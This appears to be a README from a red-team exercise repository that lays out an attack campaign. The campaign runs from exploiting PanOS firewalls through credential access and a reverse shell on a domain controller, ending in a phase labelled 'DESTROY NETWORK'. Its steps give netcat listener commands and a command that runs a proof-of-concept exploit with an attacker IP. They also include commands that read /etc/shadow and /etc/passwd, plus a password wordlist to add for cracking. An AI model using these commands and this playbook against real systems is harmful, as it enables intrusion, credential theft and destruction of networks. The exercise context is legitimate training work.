# Cyber-Yankee-2025

## Sassy Panda

[Phase1](Phase1) - #PanOS Exploit

[Phase2](Phase2) - #PanOS Internal Reconnaissance & Enumeration

[Phase3](Phase3) - #PanOS Persistence

[Phase4](Phase4) - #PanOS proxy chains

---

[Phase5](Phase5) - #Discovery Inside Orange Space

[Phase6](Phase6) - #Credential Access (via LDAP, SAM/NTDS)

---

[Phase7](Phase7) - Lateral Movement and Persistence *DAY 3*

[Phase8](Phase8) - `WinDefMon` Reverse Shell Service on DC

[Phase9](Phase9) - OT Network Target Prep (Later Stage) *DAY 4* - DESTROY NETWORK

## Steps

1. initial access - setup initial listener (netcat/metasploit) with your 61574
    run command: `nc -lvnp 61574`
2. setup callback listener 63842
    run command: `nc -lvnp 63842`
3. run python:
    `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform
    run command:
    `whoami` # detect who we are
    `cat /etc/shadow` # grab the users on the machine
    `cat /etc/passwd` # grab what shell permissions every user has
    `uname -a` # detect what machine we are running
5.  Add passwords to rockyou.txt

```
Summer2025
JohnDoe123
Password123!
Football@2023
C0ffeeMorn1ng
Ilov3mydog!
ChocolateCake1
BlueSky_2024
M!nnesota@123
GreenTea4U
Soccer#1Fan
p@ssw0rd!!
M!ch@el123
Winter2023#
B3autifulDay!
1234Qwerty!
H@ppyDay#1
MickeyMouse99
P@ssword2024!
Tiger@12345
!LoveCoding4U
Il0vePizza!
$uperman2024
RedCar$2023
L0veMyPet$
PurpleRain2024
!BrightSun2023
P@rtn3rInLife!
M@rtha12!
FishingTrip#2024
Coffee_@123
B@by_Queen23
NewYork2024!
B1gCats123
Tiger$Lover2023
CodingRocks!23
Weekend_2023
Fr@nkie_Love
123A1B2C3$
Cr@zy2023!
HappyD@ys123
@HomeSweetHome
Flowers_2024!
M@xy88!
CoMput3r$2023
L0veMyLife!
Sunshine!123
D3sert_sand
Smart_Guy2023
Jumpy_Dog$2024
Princess!123
March@2025
Security2025!
m@nny_smith
G@rdenFlowers
B3autiful2024
Lucky_1234
CoffeeTime!24
C0d3r_Life
Windy_Day!2024
SpringFl0wers#
ChocoC@ke2023
G@rden_Party!
N0vember@2024
M@rtin007
Silver@Fox23
BestD@y2024
E@gleEye2023
Amazing_2024!
St@rWars123
Sugar@L0ve
Little_Lamb2024
Super@star23
T1me2W1n
Alp@caFarm2024
Cool_Dude123
Sp@rkle_Snow
Peace!_2023
LoveToCode23
John!N@g@2023
Doggie2024!
St@rLover!12
M@zyRain@23
12J@neDoe#
Beach_@Sun2024
R3liable@Friend
Jumper_1234
CatsAre#cute!
Delicious!Bite
123_f@llSun
Powerful123#
Game_Over2023
TastyTreat#1
Princess_@23
W0rld2024!
SkylineV!ew
HappyFeet123
@HeLLo#123
Go_Tigers2024!
Skylark_!@#23
M0nkeyLove#23
Swimming_@24
Chocolate_@12
Runner_Girl24
F@mily_Tree2024
WineLover123
H@ppyDog#23
Smart@Coder
MyG@rden2024
Coffee!Beans123
B@by1Cats
T3aTime#2024
Gr@ndma!2023
Working@Home
L@ndscape_123
Nature@Beach2024
Morning!Vibes
Winter!2024_
Best#S@lution
Ready4Work2024
Sunny#Day@123
OldH@ppy!T1mes
Rainy_Day_123
EagleFlite@123
Hunter!Fox123
Blue_Waves23
Shin1ngStar!
Trav3l@2023
SpringBreeze2024
NoT1meToStop!
Sunrise@Mom
Breeze_Sunset123
Sunset_#2024
Music_Flowers123
SkyHunter@23
Healthy_Life2024
Br!ghtM0rning
S@fety12345!
SummerD@ys2024
H@ppy!Coding
Beautiful#@rain
B3autiful2023
L0ve_theSky!
Time4Bed@23
M0rning!L@nd
St@rBurst2024
BigH0lidays#
FoodLover2024!
Strong#Heart1
Let'sGo!ToBe
MasterCode!23
D0gLovers123
K!ttenTime2024
PuppyLove_23
Peachy@Life24
Fancy_2024!
BeachTime24
SleepyM0rning!
G0ldenMoon#23
CoolDays@123
!QAZ@WSX1qaz2wsx
```
